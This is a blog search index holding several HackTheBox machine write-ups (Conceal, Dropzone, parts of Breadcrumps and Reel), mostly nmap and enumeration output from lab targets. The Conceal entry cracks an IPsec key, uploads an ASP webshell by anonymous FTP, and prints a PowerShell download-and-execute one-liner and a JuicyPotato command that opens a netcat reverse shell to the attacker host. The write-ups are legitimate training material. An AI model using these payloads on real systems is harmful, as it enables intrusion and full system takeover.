2023-09-17 19:47 BST Warning: 10.10.10.228 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.228 (10.10.10.228) Host is up (0.096s latency). Not shown: 62260 filtered tcp ports (no-response), 3270 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 5040/tcp open unknown └─$ nmap -Pn -p22,80,135,139,443,445,3306,5040 -sC -sV 10.","tags":["HTB","python","cookies","jwt","upload","webshell","defender","tunnel","stickynotes","sqlite","ghidra","sqli","injection","cyberchef","aes","crypto"],"title":"[HTB] Machine: Breadcrumps"},{"categories":null,"contents":"Conceal Enumeration nmap └─$ nmap -Pn -p- 10.10.10.116 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:23 BST Nmap scan report for 10.10.10.116 (10.10.10.116) Host is up. All 65535 scanned ports on 10.10.10.116 (10.10.10.116) are in ignored states. Not shown: 65535 filtered tcp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 65.19 seconds └─$ sudo nmap -sU -p- 10.10.10.116 --min-rate 5000 -T4 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:25 BST Nmap scan report for 10.10.10.116 (10.10.10.116) Host is up (0.10s latency). Not shown: 65533 open|filtered udp ports (no-response) PORT STATE SERVICE 161/udp open snmp 500/udp open isakmp Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds └─$ sudo nmap -sU -p161,500 -sC -sV 10.10.10.116 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:26 BST Nmap scan report for 10.10.10.116 (10.10.10.116) Host is up (0.10s latency). PORT STATE SERVICE VERSION 161/udp open snmp SNMPv1 server (public) | snmp-sysdescr: Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free) |_ System uptime: 7m13.71s (43371 timeticks) | snmp-win32-software: | Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2021-03-17T15:16:36 | Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2021-03-17T15:16:36 |_ VMware Tools; 2021-03-17T15:16:36 | snmp-processes: | 1: | Name: System Idle Process | 4: | Name: System | 60: | Name: svchost.exe | Path: C:\\Windows\\System32\\ | Params: -k LocalSystemNetworkRestricted | 300: | Name: smss.exe | 332: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k LocalServiceNoNetwork | 396: | Name: csrss.exe | 408: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k LocalServiceAndNoImpersonation | 472: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k LocalService | 476: | Name: wininit.exe | 488: | Name: csrss.exe | 544: | Name: winlogon.exe | 616: | Name: services.exe | 624: | Name: lsass.exe | Path: C:\\Windows\\system32\\ | 712: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k DcomLaunch | 732: | Name: fontdrvhost.exe | 740: | Name: fontdrvhost.exe | 828: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k RPCSS | 936: | Name: dwm.exe | 956: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k netsvcs | 988: | Name: svchost.exe | Path: C:\\Windows\\System32\\ | Params: -k LocalServiceNetworkRestricted | 1052: | Name: svchost.exe | Path: C:\\Windows\\System32\\ | Params: -k NetworkService | 1116: | Name: vmacthlp.exe | Path: C:\\Program Files\\VMware\\VMware Tools\\ | 1324: | Name: svchost.exe | Path: C:\\Windows\\System32\\ | Params: -k LocalServiceNetworkRestricted | 1376: | Name: Memory Compression | 1404: | Name: svchost.exe | Path: C:\\Windows\\System32\\ | Params: -k LocalServiceNetworkRestricted | 1412: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k LocalServiceNetworkRestricted | 1420: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k LocalSystemNetworkRestricted | 1544: | Name: spoolsv.exe | Path: C:\\Windows\\System32\\ | 1640: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k appmodel | 1724: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k apphost | 1740: | Name: svchost.exe | Path: C:\\Windows\\System32\\ | Params: -k utcsvc | 1780: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k ftpsvc | 1812: | Name: LogonUI.exe | Params: /flags:0x0 /state0:0xa39c8855 /state1:0x41c64e6d | 1848: | Name: SecurityHealthService.exe | 1864: | Name: snmp.exe | Path: C:\\Windows\\System32\\ | 1888: | Name: VGAuthService.exe | Path: C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\ | 1908: | Name: vmtoolsd.exe | Path: C:\\Program Files\\VMware\\VMware Tools\\ | 1928: | Name: ManagementAgentHost.exe | Path: C:\\Program Files\\VMware\\VMware Tools\\VMware CAF\\pme\\bin\\ | 1952: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k iissvcs | 1992: | Name: MsMpEng.exe | 2424: | Name: svchost.exe | Path: C:\\Windows\\system32\\ | Params: -k NetworkServiceNetworkRestricted | 2708: | Name: SearchIndexer.exe | Path: C:\\Windows\\system32\\ | Params: /Embedding | 2728: | Name: svchost.exe | 2816: | Name: WmiPrvSE.exe | Path: C:\\Windows\\system32\\wbem\\ | 2964: | Name: msdtc.exe | Path: C:\\Windows\\System32\\ | 2992: | Name: dllhost.exe | Path: C:\\Windows\\system32\\ | Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235} | 3484: | Name: NisSrv.exe | 3828: | Name: svchost.exe | Path: C:\\Windows\\System32\\ | Params: -k smphost | 3952: | Name: WmiPrvSE.exe |_ Path: C:\\Windows\\system32\\wbem\\ | snmp-interfaces: | Software Loopback Interface 1\\x00 | IP address: 127.0.0.1 Netmask: 255.0.0.0 | Type: softwareLoopback Speed: 1 Gbps | Traffic stats: 0.00 Kb sent, 0.00 Kb received | vmxnet3 Ethernet Adapter\\x00 | IP address: 10.10.10.116 Netmask: 255.255.255.0 | MAC address: 00:50:56:b9:14:2a (VMware) | Type: ethernetCsmacd Speed: 4 Gbps | Traffic stats: 88.01 Kb sent, 19.06 Mb received | vmxnet3 Ethernet Adapter-WFP Native MAC Layer LightWeight Filter-0000\\x00 | MAC address: 00:50:56:b9:14:2a (VMware) | Type: ethernetCsmacd Speed: 4 Gbps | Traffic stats: 88.01 Kb sent, 19.06 Mb received | vmxnet3 Ethernet Adapter-QoS Packet Scheduler-0000\\x00 | MAC address: 00:50:56:b9:14:2a (VMware) | Type: ethernetCsmacd Speed: 4 Gbps | Traffic stats: 88.01 Kb sent, 19.06 Mb received | vmxnet3 Ethernet Adapter-WFP 802.3 MAC Layer LightWeight Filter-0000\\x00 | MAC address: 00:50:56:b9:14:2a (VMware) | Type: ethernetCsmacd Speed: 4 Gbps |_ Traffic stats: 88.01 Kb sent, 19.06 Mb received | snmp-netstat: | TCP 0.0.0.0:21 0.0.0.0:0 | TCP 0.0.0.0:80 0.0.0.0:0 | TCP 0.0.0.0:135 0.0.0.0:0 | TCP 0.0.0.0:445 0.0.0.0:0 | TCP 0.0.0.0:49664 0.0.0.0:0 | TCP 0.0.0.0:49665 0.0.0.0:0 | TCP 0.0.0.0:49666 0.0.0.0:0 | TCP 0.0.0.0:49667 0.0.0.0:0 | TCP 0.0.0.0:49668 0.0.0.0:0 | TCP 0.0.0.0:49669 0.0.0.0:0 | TCP 0.0.0.0:49670 0.0.0.0:0 | TCP 10.10.10.116:139 0.0.0.0:0 | UDP 0.0.0.0:161 *:* | UDP 0.0.0.0:500 *:* | UDP 0.0.0.0:4500 *:* | UDP 0.0.0.0:5050 *:* | UDP 0.0.0.0:5353 *:* | UDP 0.0.0.0:5355 *:* | UDP 10.10.10.116:137 *:* | UDP 10.10.10.116:138 *:* | UDP 10.10.10.116:1900 *:* | UDP 10.10.10.116:57836 *:* | UDP 127.0.0.1:1900 *:* |_ UDP 127.0.0.1:57837 *:* | snmp-win32-users: | Administrator | DefaultAccount | Destitute |_ Guest | snmp-win32-services: | AppX Deployment Service (AppXSVC) | Application Host Helper Service | Background Intelligent Transfer Service | Background Tasks Infrastructure Service | Base Filtering Engine | CNG Key Isolation | COM+ Event System | COM+ System Application | Client License Service (ClipSVC) | Connected Devices Platform Service | Connected User Experiences and Telemetry | CoreMessaging | Cryptographic Services | DCOM Server Process Launcher | DHCP Client | DNS Client | Data Usage | Device Setup Manager | Diagnostic Policy Service | Diagnostic Service Host | Diagnostic System Host | Distributed Link Tracking Client | Distributed Transaction Coordinator | Group Policy Client | IKE and AuthIP IPsec Keying Modules | IP Helper | IPsec Policy Agent | Local Session Manager | Microsoft FTP Service | Microsoft Storage Spaces SMP | Network Connection Broker | Network List Service | Network Location Awareness | Network Store Interface Service | Plug and Play | Power | Print Spooler | Program Compatibility Assistant Service | RPC Endpoint Mapper | Remote Procedure Call (RPC) | SNMP Service | SSDP Discovery | Security Accounts Manager | Security Center | Server | Shell Hardware Detection | State Repository Service | Superfetch | System Event Notification Service | System Events Broker | TCP/IP NetBIOS Helper | Task Scheduler | Themes | Time Broker | TokenBroker | User Manager | User Profile Service | VMware Alias Manager and Ticket Service | VMware CAF Management Agent Service | VMware Physical Disk Helper Service | VMware Tools | WinHTTP Web Proxy Auto-Discovery Service | Windows Audio | Windows Audio Endpoint Builder | Windows Connection Manager | Windows Defender Antivirus Network Inspection Service | Windows Defender Antivirus Service | Windows Defender Security Centre Service | Windows Driver Foundation - User-mode Driver Framework | Windows Event Log | Windows Firewall | Windows Font Cache Service | Windows Management Instrumentation | Windows Process Activation Service | Windows Push Notifications System Service | Windows Search | Windows Update | Workstation |_ World Wide Web Publishing Service 500/udp open isakmp Microsoft Windows 8 | ike-version: | vendor_id: Microsoft Windows 8 | attributes: | MS NT5 ISAKMPOAKLEY | RFC 3947 NAT-T | draft-ietf-ipsec-nat-t-ike-02\\n | IKE FRAGMENTATION | MS-Negotiation Discovery Capable |_ IKE CGA version 1 Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 200.52 seconds snmp └─$ snmpwalk -v 2c -c public 10.10.10.116 SNMPv2-MIB::sysDescr.0 = STRING: Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free) SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.311.1.1.3.1.1 DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (16739) 0:02:47.39 SNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43 SNMPv2-MIB::sysName.0 = STRING: Conceal ... Foothold/User We have an interesting entry STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43 Cracking it results in: Dudecake1! We also saw port 500 https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting#finding-a-valid-transformation └─$ ike-scan -M 10.10.10.116 Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/) 10.10.10.116 Main Mode Handshake returned HDR=(CKY-R=890d2a52350b91e4) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080) VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8) VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T) VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n) VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation) VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable) VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1) Ending ike-scan 1.9.5: 1 hosts scanned in 0.116 seconds (8.64 hosts/sec). 1 returned handshake; 0 returned notify Let\u0026rsquo;s use strongswan We need to edit /etc/ipsec.conf and /etc/ipsec.secrets to be able to connect https://docs.strongswan.org/docs/5.9/config/strongswanConf.html ipsec.conf Based on: https://www.strongswan.org/testing/testresults/ikev1-stroke/net2net-psk/moon.ipsec.conf https://www.linode.com/docs/guides/strongswan-vpn-server-install/ https://www.tecmint.com/setup-ipsec-vpn-with-strongswan-on-debian-ubuntu/ config setup charondebug=\u0026#34;all\u0026#34; uniqueids=yes conn conceal type=transport auto=start keyexchange=ikev1 authby=secret left=10.10.16.4 leftprotoport=tcp right=10.10.10.116 rightprotoport=tcp ike=3des-sha1-modp1024! esp=3des-sha1! ipsec.secrets # This file holds shared secrets or RSA private keys for authentication. # RSA private key for this host, authenticating it to any other host # which knows the public part. %any : PSK \u0026#34;Dudecake1!\u0026#34; Now start ipsec as root No errors so far ┌──(root㉿kali)-[/home/kali] └─# ipsec start --nofork Starting strongSwan 5.9.11 IPsec [starter]... 00[DMN] Starting IKE charon daemon (strongSwan 5.9.11, Linux 6.3.0-kali1-amd64, x86_64) 00[LIB] providers loaded by OpenSSL: default legacy 00[CFG] install DNS servers in \u0026#39;/etc/resolv.conf\u0026#39; 00[CFG] loading ca certificates from \u0026#39;/etc/ipsec.d/cacerts\u0026#39; 00[CFG] loading aa certificates from \u0026#39;/etc/ipsec.d/aacerts\u0026#39; 00[CFG] loading ocsp signer certificates from \u0026#39;/etc/ipsec.d/ocspcerts\u0026#39; 00[CFG] loading attribute certificates from \u0026#39;/etc/ipsec.d/acerts\u0026#39; 00[CFG] loading crls from \u0026#39;/etc/ipsec.d/crls\u0026#39; 00[CFG] loading secrets from \u0026#39;/etc/ipsec.secrets\u0026#39; 00[CFG] loaded IKE secret for %any 00[LIB] loaded plugins: charon aesni aes rc2 sha2 sha1 md5 mgf1 random nonce x509 revocation constraints pubkey pkcs1 pkcs7 pkcs12 pgp dnskey sshkey pem openssl pkcs8 fips-prf gmp agent xcbc hmac kdf gcm drbg attr kernel-netlink resolve socket-default connmark stroke updown eap-mschapv2 xauth-generic counters 00[LIB] dropped capabilities, running as uid 0, gid 0 00[JOB] spawning 16 worker threads charon (110363) started after 40 ms 09[CFG] received stroke: add connection \u0026#39;conceal\u0026#39; 09[CFG] added configuration \u0026#39;conceal\u0026#39; 09[CFG] received stroke: initiate \u0026#39;conceal\u0026#39; 09[IKE] initiating Main Mode IKE_SA conceal[1] to 10.10.10.116 ... Now let\u0026rsquo;s nmap again We have to perform full TCP scan We can\u0026rsquo;t perform SYN scan over VPN We saw ports in snmpwalk We can simply specify them in nmap └─$ nmap -sC -sV -sT -p21,80,135,139,445 10.10.10.116 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 19:01 BST Nmap scan report for 10.10.10.116 (10.10.10.116) Host is up (0.15s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-19T18:00:45 |_ start_date: 2023-09-19T17:00:08 |_clock-skew: -39s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.26 seconds Web server gobuster and feroxbuster └─$ gobuster dir -u http://10.10.10.116/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.116/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/09/19 19:09:29 Starting gobuster in directory enumeration mode =============================================================== /upload (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.116/upload/] └─$ feroxbuster -u http://10.10.10.116 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.116 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 404 GET 98l 332w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 2l 10w 150c http://10.10.10.116/upload =\u0026gt; http://10.10.10.116/upload/ 200 GET 359l 2112w 178556c http://10.10.10.116/iisstart.png 200 GET 32l 54w 696c http://10.10.10.116/ ftp It\u0026rsquo;s empty, but we can upload files The ftp is pointed to /upload └─$ ftp anonymous@10.10.10.116 Connected to 10.10.10.116. 220 Microsoft FTP Service 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||49674|) 125 Data connection already open; Transfer starting. 226 Transfer complete. ftp\u0026gt; put test.txt local: test.txt remote: test.txt 229 Entering Extended Passive Mode (|||49675|) 125 Data connection already open; Transfer starting. 100% |***********************************************************************************************************************************************************************************************| 19 2.54 KiB/s --:-- ETA 226 Transfer complete. 19 bytes sent in 00:00 (0.08 KiB/s) ftp\u0026gt; Let\u0026rsquo;s try webshell The responses indicate that the it could be asp I\u0026rsquo;ll try fuzzdb-webshell/asp/cmd.asp from webshells repo `` └─$ ftp anonymous@10.10.10.116 Connected to 10.10.10.116. 220 Microsoft FTP Service 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; put cmd.asp local: cmd.asp remote: cmd.asp 229 Entering Extended Passive Mode (|||49679|) 125 Data connection already open; Transfer starting. 100% |***********************************************************************************************************************************************************************************************| 970 2.65 MiB/s --:-- ETA 226 Transfer complete. 970 bytes sent in 00:00 (4.23 KiB/s) ftp\u0026gt; Payload for revshell powershell \u0026quot;iex(New-Object Net.Webclient).downloadstring('http://10.10.16.4/shell.ps1')\u0026quot; Root whoami PS C:\\admin_checks\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeShutdownPrivilege Shut down the system Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled We have SeImpersonatePrivilege Let\u0026rsquo;s try JuicyPotato On the first try we have a error 10038 We need to try another clsid https://ohpe.it/juicy-potato/CLSID/ PS C:\\programdata\u0026gt; .\\jp.exe -l 1337 -c \u0026#34;{4991d34b-80a1-4291-83b6-3328366b9097}\u0026#34; -p c:\\windows\\system32\\cmd.exe -a \u0026#34;/c \\programdata\\nc.exe -e cmd.exe 10.10.16.4 7777\u0026#34; -t * Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337 COM -\u0026gt; recv failed with error: 10038 PS C:\\programdata\u0026gt; .\\jp.exe -l 1337 -c \u0026#34;{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}\u0026#34; -p c:\\windows\\system32\\cmd.exe -a \u0026#34;/c \\programdata\\nc.exe -e cmd.exe 10.10.16.4 7777\u0026#34; -t * Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337 ...... [+] authresult 0 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK ","date":"September 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/conceal/images/conceal.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/conceal/","summary":"Conceal Enumeration nmap └─$ nmap -Pn -p- 10.10.10.116 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:23 BST Nmap scan report for 10.10.10.116 (10.10.10.116) Host is up. All 65535 scanned ports on 10.10.10.116 (10.10.10.116) are in ignored states. Not shown: 65535 filtered tcp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 65.19 seconds └─$ sudo nmap -sU -p- 10.10.10.116 --min-rate 5000 -T4 [sudo] password for kali: Starting Nmap 7.","tags":["HTB","snmp","snmpwalk","ike","ipsec","ike-scan","strongswan","iis","gobuster","webshell","upload","nishang","juicypotato","potato"],"title":"[HTB] Machine: Conceal"},{"categories":null,"contents":"Dropzone Enumeration nmap └─$ nmap -Pn -p- 10.10.10.90 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 10:42 BST Nmap scan report for 10.10.10.90 (10.10.10.90) Host is up. All 65535 scanned ports on 10.10.10.90 (10.10.10.90) are in ignored states. Not shown: 65535 filtered tcp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 65.20 seconds └─$ sudo nmap -p- -sU 10.10.10.90 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 10:51 BST Nmap scan report for 10.10.10.90 (10.10.10.90) Host is up (0.098s latency). Not shown: 65533 open|filtered udp ports (no-response) PORT STATE SERVICE 69/udp open tftp 1042/udp open afrog Nmap done: 1 IP address (1 host up) scanned in 39.89 seconds └─$ sudo nmap -p69,1042 -sC -sV -sU 10.10.10.90 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 10:55 BST Nmap scan report for 10.10.10.90 (10.10.10.90) Host is up (0.19s latency). PORT STATE SERVICE VERSION 69/udp open tftp SolarWinds Free tftpd | tftp-version: | If you know the name or version of the software running on this port, please submit it to dev@nmap.org along with the following information: | opcode: 5 | errcode: 1 | length: 43 | rport: 1044 |_ errmsg: Could not find file \u0026#39;C:\\BMAuRGtQ.NIU\u0026#39;. 1042/udp open|filtered afrog Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 123.24 seconds Root tftp └─$ tftp 10.10.10.90 tftp\u0026gt; ? tftp-hpa 5.2 Commands may be abbreviated. Commands are: connect connect to remote tftp mode set file transfer mode put send file get receive file quit exit tftp verbose toggle verbose mode trace toggle packet tracing literal toggle literal mode, ignore \u0026#39;:\u0026#39; in file name status show current status binary set mode to octet ascii set mode to netascii rexmt set per-packet transmission timeout timeout set total retransmission timeout ? print help information help print help information We can send and get files that exist └─$ tftp 10.10.10.90 tftp\u0026gt; put test.txt tftp\u0026gt; get test.txt tftp\u0026gt; get something.txt Error code 1: Could not find file \u0026#39;C:\\something.txt\u0026#39;. tftp\u0026gt; But we can\u0026rsquo;t access \u0026lsquo;hives\u0026rsquo; └─$ tftp 10.10.10.90 tftp\u0026gt; get \\windows\\system32\\config\\sam Error code 1: The process cannot access the file \u0026#39;C:\\windows\\system32\\config\\sam\u0026#39; because it is being used by another process. Let\u0026rsquo;s gather OS info It\u0026rsquo;s Windows XP SP3 tftp\u0026gt; get \\windows\\system32\\eula.txt tftp\u0026gt; get \\windows\\system32\\license.rtf Error code 1: Could not find file \u0026#39;C:\\windows\\system32\\license.rtf\u0026#39;. └─$ cat \u0026#39;\\windows\\system32\\eula.txt\u0026#39; END-USER LICENSE AGREEMENT FOR MICROSOFT SOFTWARE MICROSOFT WINDOWS XP PROFESSIONAL EDITION SERVICE PACK 3 IMPORTANT-READ CAREFULLY: This End-User License Agreement (\u0026#39;EULA\u0026#39;) is a legal agreement between you (either an individual or a single entity) and Microsoft Corporation or one of its affiliates (\u0026#39;Microsoft\u0026#39;) for the Microsoft software that accompanies this EULA, which includes computer software and may include associated media, printed materials, \u0026#39;online\u0026#39; or electronic documentation, and Internet-based services (\u0026#39;Software\u0026#39;). An amendment or addendum to this EULA may accompany the Software. Some of the terms have changed since the initial release of Windows XP Service Pack 2. The changes include: ... ","date":"September 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/dropzone/images/dropzone.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/dropzone/","summary":"Dropzone Enumeration nmap └─$ nmap -Pn -p- 10.10.10.90 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 10:42 BST Nmap scan report for 10.10.10.90 (10.10.10.90) Host is up. All 65535 scanned ports on 10.10.10.90 (10.10.10.90) are in ignored states. Not shown: 65535 filtered tcp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 65.20 seconds └─$ sudo nmap -p- -sU 10.10.10.90 -T4 --min-rate 5000 Starting Nmap 7.","tags":["HTB"],"title":"[HTB] Machine: Dropzone"},{"categories":null,"contents":"Reel Enumeration nmap └─$ nmap -Pn -p- 10.10.10.77 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 18:39 BST Nmap scan report for 10.10.10.77 (10.10.10.77) Host is up (0.093s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 25/tcp open smtp 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 49159/tcp open unknown └─$ nmap -Pn -p21,22,25,135,139,445,593 -sC -sV 10.10.10.77 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 18:43 BST Stats: 0:03:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.90% done; ETC: 18:46 (0:00:00 remaining) Nmap scan report for 10.10.10.77 (10.10.10.77) Host is up (0.14s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_05-29-18 12:19AM \u0026lt;DIR\u0026gt; documents | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH 7.6 (protocol 2.0) | ssh-hostkey: | 2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA) | 256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA) |_ 256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519) 25/tcp open smtp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: | 220 Mail Service ready | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: | 220 Mail Service ready | sequence of commands | sequence of commands | Hello: | 220 Mail Service ready | EHLO Invalid domain address. | Help: | 220 Mail Service ready | DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | SIPOptions: | 220 Mail Service ready | sequence of commands | sequence of commands | sequence of commands | sequence of commands | sequence of commands | sequence of commands | sequence of commands | sequence of commands | sequence of commands | sequence of commands | sequence of commands | TerminalServerCookie: | 220 Mail Service ready |_ sequence of commands | smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB) 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port25-TCP:V=7.94%I=7%D=9/13%Time=6501F4AB%P=x86_64-pc-linux-gnu%r(NULL SF:,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(Hello,3A,\u0026#34;220\\x20Mail\\x20S SF:ervice\\x20ready\\r\\n501\\x20EHLO\\x20Invalid\\x20domain\\x20address\\.\\r\\n\u0026#34;)% SF:r(Help,54,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n211\\x20DATA\\x20HELO\\x20EH SF:LO\\x20MAIL\\x20NOOP\\x20QUIT\\x20RCPT\\x20RSET\\x20SAML\\x20TURN\\x20VRFY\\r\\n\u0026#34; SF:)%r(GenericLines,54,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20Bad\\x20s SF:equence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r 